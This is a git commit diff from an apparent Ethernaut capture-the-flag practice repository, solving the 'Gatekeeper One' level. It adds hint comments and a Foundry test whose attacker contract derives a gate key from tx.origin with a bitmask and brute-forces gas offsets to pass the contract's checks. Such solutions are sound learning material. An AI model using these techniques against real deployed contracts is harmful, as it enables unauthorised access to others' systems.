a9f476bad4d9508e6c969de98a88f192bd7f7194
islu <38793955+islu@users.noreply.github.com>
2024-04-18 11:28:58 +0800

    solve challenge (Gatekeeper One)

--- src/levels/GatekeeperOne.sol
+++ src/levels/GatekeeperOne.sol
@@ -1,6 +1,13 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
+// Make it past the gatekeeper and register as an entrant to pass this level.
+//
+// Things that might help:
+//  - Remember what you've learned from the Telephone and Token levels.
+//  - You can learn more about the special function gasleft(), in Solidity's documentation (see here and here).
+//      - https://docs.soliditylang.org/en/v0.8.3/units-and-global-variables.html
+//      - https://docs.soliditylang.org/en/v0.8.3/control-structures.html#external-function-calls
 contract GatekeeperOne {
     address public entrant;
 
--- test/GatekeeperOne.t.sol
+++ test/GatekeeperOne.t.sol
@@ -5,21 +5,62 @@ import {EthernautTest} from "./utils/EthernautTest.sol";
 import {GatekeeperOneFactory} from "../src/factories/GatekeeperOneFactory.sol";
 import {GatekeeperOne} from "../src/levels/GatekeeperOne.sol";
 
+import "forge-std/console.sol";
+
 contract GatekeeperOneTest is EthernautTest {
     GatekeeperOneFactory public factory;
 
     function setUp() public override {
-	super.setUp();
+        super.setUp();
         factory = new GatekeeperOneFactory();
         ethernaut.registerLevel(factory);
         levelAddress = ethernaut.createLevelInstance(factory);
     }
 
     function testSolveGatekeeperOne() public {
-	GatekeeperOne instance = GatekeeperOne(payable(levelAddress));
-	
-	// insert your code here!
-	
+        // GatekeeperOne keeper = GatekeeperOne(payable(levelAddress));
+
+        // [START]
+
+        // 1. Deploy attacker contract
+        GatekeeperOneAttack attacker = new GatekeeperOneAttack(
+            payable(levelAddress)
+        );
+
+        // 2. Call enter()
+        for (uint256 i = 1; i <= 8191; i++) {
+            try attacker.enter(i) {
+                console.log("gas", i);
+            } catch {}
+        }
+
+        // [END]
+
         assert(factory.validateInstance(payable(levelAddress), tx.origin));
+    }
+}
+
+// Attacker contract
+contract GatekeeperOneAttack {
+    GatekeeperOne public target;
+
+    constructor(address _target) {
+        target = GatekeeperOne(_target);
+    }
+
+    function enter(uint gas) public returns (bool) {
+        // k = uint64(_gateKey)
+        // uint32(k) == uint16(k)
+        // uint32(k) != k
+        // uint32(k) == uint16(uint160(tx.origin))
+
+        // k == uint160(tx.origin)
+        // uint64(_gateKey) == uint160(tx.origin)
+        uint64 u64 = uint64(uint160(tx.origin));
+
+        bytes8 key = bytes8(u64) & 0xFFFFFFFF0000FFFF;
+
+        bool result = target.enter{gas: 8191 * 10 + gas}(key);
+        return result;
     }
 }
